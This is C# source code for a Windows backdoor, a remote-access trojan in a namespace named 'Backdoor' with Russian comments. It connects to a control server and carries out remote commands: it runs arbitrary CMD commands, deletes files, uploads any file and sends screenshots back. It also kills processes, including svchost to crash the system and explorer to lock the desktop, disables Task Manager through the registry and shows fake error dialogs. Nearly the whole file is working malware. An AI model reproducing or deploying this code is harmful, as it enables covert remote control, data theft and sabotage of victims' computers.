using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Xml;
using System.Drawing;

namespace Backdoor
{
    class Program
    {
        static void Main(string[] args)
        {
            var server = new Server();
            server.Connect();
        }

    }
    public class Server
    {
        private string adress = "127.0.0.1";
        private int port = 7777;
        private Socket conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);

        public void Connect()
        {
            conn = null;
            conn = new Socket(new AddressFamily(), SocketType.Stream, ProtocolType.Tcp);
            while (true)
            {
                try
                {
                    IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(adress), port);
                    conn.Connect(ipEndPoint);
                    Loop();
                    break;
                }
                catch (Exception e)
                {
                    var m = e.Message;
                }
            }
        }

        private void Loop()
        {
            while (true)
            {
                string data = null;

                byte[] bytes = new byte[100000];
                int bytesRec = 0;
                try
                {
                    bytesRec = conn.Receive(bytes);
                }
                catch
                {
                    Connect();
                    break;
                }

                data = Encoding.UTF8.GetString(bytes, 0, bytesRec);


                Console.Write("Полученный текст: " + data + "\n\n"); ;

                if (data.StartsWith("ls"))
                {
                    data = data.Remove(0, 2);
                    string path = ParseComand(data);
                    var dirFiles = Directory.GetFiles(path);
                    var directoris = Directory.GetDirectories(path);
                    string files = "";

                    files += "<files> ";
                    for (int i = 0; i < dirFiles.Length; i++)
                    {
                        files += $" <file{i}> " + Path.GetFileName(dirFiles[i]) + $" </file{i}>";
                    }
                    for (int i = 0; i < directoris.Length; i++)
                    {
                        files += $" <dir{i}> " + "/" + Path.GetFileName(directoris[i]) + $" </dir{i}>";
                    }
                    files += " </files>";
                    conn.Send(Encoding.UTF8.GetBytes(files));
                    data = "";//чтобы система не упала
                    continue;
                }

                if (data.StartsWith("rm"))
                {

                    data = data.Remove(0, 2);
                    string path = ParseComand(data);
                    try { File.Delete(path); } catch { }
                    try { Directory.Delete(path, true); } catch { }

                    conn.Send(Encoding.UTF8.GetBytes("Файл " + path + " удалён."));
                    data = "";//чтобы система не упала
                    continue;
                }

                if (data.StartsWith("start"))
                {

                    data = data.Remove(0, 5);
                    string path = ParseComand(data);

                    //Process myProcess = new Process();
                    //myProcess.StartInfo.FileName = path;
                    try
                    {
                        var t = new System.Threading.Thread(() => Process.Start(path));
                        t.Start();
                    }
                    catch (Exception e)
                    {
                        conn.Send(Encoding.UTF8.GetBytes("Ошибка: " + e.Message));
                        continue;
                    }

                    conn.Send(Encoding.UTF8.GetBytes("Процесс " + path + " запущён."));
                    data = "";//чтобы система не упала
                    continue;
                }


                if (data.StartsWith("pkill"))
                {
                    data = data.Remove(0, 5);
                    var pname = ParseComand(data);
                    var process = Process.GetProcesses();
                    for (int i = 0; i < process.Length; i++)
                    {
                        if (process[i].ProcessName == pname)
                        {
                            process[i].Kill();
                            break;
                        }
                    }
                    conn.Send(Encoding.UTF8.GetBytes("Процесс с именем " + pname + " уничтожен"));
                    data = "";//чтобы система не упала
                    continue;
                }

                if (data == "tasklist")
                {
                    string tasks = "";

                    var process = Process.GetProcesses();
                    tasks += "<tasklist>";
                    for (int i = 0; i < process.Length; i++)
                    {
                        tasks += "<task>" + process[i].ProcessName + "</task>";
                    }
                    tasks += "</tasklist>";
                    /*
                    for (int i = 0; i < process.Length; i++)
                    {
                        tasks += " " + "_task" + process[i].ProcessName + " ";
                    }
                    */
                    var pmsg = Encoding.UTF8.GetBytes(tasks);//"Все процессы в системе: " + "\r\n " + tasks + " ");
                    if (pmsg.Length > 9999) Array.Resize(ref pmsg, 9999);
                    conn.Send(pmsg);
                    data = "";//чтобы система не упала
                    continue;
                }

                if (data.StartsWith("cmd"))
                {
                    data = data.Remove(0, 3);
                    string comm = ParseComand(data);
                    Console.WriteLine(comm);

                    var proc = new Process();
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.FileName = "CMD.exe";
                    proc.StartInfo.Arguments = " /C " + comm;
                    proc.Start();
                    string result = proc.StandardOutput.ReadToEnd();
                    conn.Send(Encoding.UTF8.GetBytes(result));
                    data = "";//чтобы система не упала

                    continue;
                }

                if (data.StartsWith("msg"))
                {
                    data = data.Remove(0, 3);


                    string msg = ParseComand(data);
                    //string sub = ParseComand(data, '&');

                    XmlDocument doc = new XmlDocument();
                    string docContent = msg;
                    doc.LoadXml(docContent);

                    XmlNode root = doc.FirstChild;

                    var textMsg = "";
                    var textSub = "";
                    var textBut = "";
                    var textIco = "";

                    if (root.HasChildNodes)
                    {
                        for (int i = 0; i < root.ChildNodes.Count; i++)
                        {
                            if (root.ChildNodes[i].Name == "text")
                                textMsg = root.ChildNodes[i].InnerText;
                            if (root.ChildNodes[i].Name == "subject")
                                textSub = root.ChildNodes[i].InnerText;
                            if (root.ChildNodes[i].Name == "but")
                                textBut = root.ChildNodes[i].InnerText;
                            if (root.ChildNodes[i].Name == "ico")
                                textIco = root.ChildNodes[i].InnerText;
                        }
                    }
                    SendMSG(textMsg, textSub, int.Parse(textBut), int.Parse(textIco));

                    conn.Send(Encoding.UTF8.GetBytes($"Сообщение отправлено"));
                    data = "";

                    continue;
                }
                if (data.StartsWith("enTaskmgr"))
                {
                    data = data.Remove(0, 9);
                    string comm = ParseComand(data);
                    if (comm == "true")
                    {
                        SetTaskManager(true);
                        conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач включен"));
                    }
                    if (comm == "false")
                    {
                        SetTaskManager(false);
                        conn.Send(Encoding.UTF8.GetBytes($"Диспетчер задач выключен"));
                    }
                    data = "";

                    continue;
                }
                if (data == "bluescreen")
                {

                    var process = Process.GetProcesses();
                    for (int i = 0; i < process.Length; i++)
                    {
                        if (process[i].ProcessName == "svchost")
                        {
                            process[i].Kill();
                            break;
                        }
                    }
                    conn.Send(Encoding.UTF8.GetBytes("Система успешно крашнута"));
                    data = "";//чтобы система не упала
                    continue;
                }
                if (data.StartsWith("download"))
                {
                    data = data.Remove(0, 3);
                    string comm = ParseComand(data);
                    Console.WriteLine(comm);
                    try
                    {
                        /*
                        var msg = "<file>";
                        
                        var FileInString = Encoding.UTF8.GetString(File.ReadAllBytes(comm));
                        msg += "<fname>" + Path.GetFileName(comm) + "</fname>";
                        msg += "<bytesArr>" + FileInString + "</bytesArr>";
                        msg += "</file>";
                        var bytesFile = Encoding.UTF8.GetBytes(msg);

                        if (bytesFile.Length > 9999)
                        {
                            throw new Exception("Тобi пзда");
                        }
                        */
                        conn.Send(File.ReadAllBytes(comm));
                    }
                    catch
                    {
                        conn.Send(Encoding.UTF8.GetBytes("Не получилось скачать файл"));
                        data = "";//чтобы система не упала
                        continue;
                    }
                    data = "";//чтобы система не упала

                    continue;
                }
                if (data.StartsWith("transl"))
                {
                    var comm = ParseComand(data);
                    if (comm == "get")
                    {
                        var msg = "";
                        //msg += "<msg>";
                        //msg += "<frame>";
                        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);


                        Graphics graphics = Graphics.FromImage(bitmap as System.Drawing.Image);
                        graphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));


                        //File.WriteAllBytes("kek.jpg", bytes);
                        bitmap = ResizeImg(1140, 641, bitmap);

                        MemoryStream stream = new MemoryStream();
                        bitmap.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
                        Byte[] bytesForSend = stream.ToArray();

                        //msg += Convert.ToBase64String(bytesForSend);
                        //msg += "</frame>";
                        //msg += "</msg>";

                        conn.Send(bytesForSend);
                        data = "";
                        continue;
                    }
                }
                if (data.StartsWith("block"))
                {
                    data = data.Remove(0, 5);
                    string comm = ParseComand(data);
                    Console.WriteLine(comm);
                    if (comm == "true")
                    {
                        try
                        {
                            var process = Process.GetProcesses();
                            for (int i = 0; i < process.Length; i++)
                            {
                                if (process[i].ProcessName == "explorer")
                                {
                                    process[i].Kill();
                                    break;
                                }
                            }
                            foreach (Process proc in process)
                            {
                                if (!String.IsNullOrEmpty(proc.MainWindowTitle))
                                {
                                    Console.WriteLine("Process: {0} ID: {1} Window title: {2}", proc.ProcessName, proc.Id, proc.MainWindowTitle);
                                }
                            }
                            conn.Send(Encoding.UTF8.GetBytes("заблокированно"));
                            continue;
                        }
                        catch
                        {
                            conn.Send(Encoding.UTF8.GetBytes("Не получилось заблокировать"));
                            data = "";
                            continue;
                        }
                    }
                    if(comm == "false")
                    {
                        conn.Send(Encoding.UTF8.GetBytes("разблокированно"));
                        continue;
                    }
                    else
                    {
                        conn.Send(Encoding.UTF8.GetBytes("случилось что-то не понятное"));
                        continue;
                    }
                    data = "";

                    continue;
                }
                if (data.StartsWith("curblock"))
                {
                    data = data.Remove(0, 5);
                    string comm = ParseComand(data);
                    Console.WriteLine(comm);
                    if (comm == "true")
                    {
                        conn.Send(Encoding.UTF8.GetBytes("курсор заблокирован"));
                        continue;
                    }
                    if (comm == "false")
                    {
                        conn.Send(Encoding.UTF8.GetBytes("курсор разблокирован"));
                        continue;
                    }
                }
                conn.Send(Encoding.UTF8.GetBytes("Ошибка"));
                data = "";
            }
        }
        public static string ParseComand(string allcommand, Char attribute = '$')
        {
            string commandBody = "";


            bool flag = false;
            for (int i = 0; i < allcommand.Length; i++)
            {
                if (flag)
                    commandBody += allcommand[i];
                if (allcommand[i] == attribute)
                    flag = true;
            }
            return commandBody;
        }
        public static void AddToStartUp()
        {
            var startPath = "c:/Users/VASUS/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
            var dir = Directory.GetCurrentDirectory();
        }

        public static void SetTaskManager(bool enable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
                    objRegistryKey.DeleteValue("DisableTaskMgr");
                else
                    objRegistryKey.SetValue("DisableTaskMgr", "1");
                objRegistryKey.Close();
            }
            catch
            {
            }
        }
        public static async void SendMSG(string msg, string subject, int butNum, int icoNum)
        {
            await System.Threading.Tasks.Task.Run(() => MessageBox.Show(msg, subject, (MessageBoxButtons)butNum, MessageBoxIcon.Error));
        }
        private static Bitmap ResizeImg(int newWidth, int newHeight, Bitmap imgToResize)
        {
            Bitmap b = new Bitmap(newWidth, newHeight);
            Graphics g = Graphics.FromImage((Image)b);
            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;

            g.DrawImage(imgToResize, 0, 0, newWidth, newHeight);
            g.Dispose();

            return b;
        }
    }

}
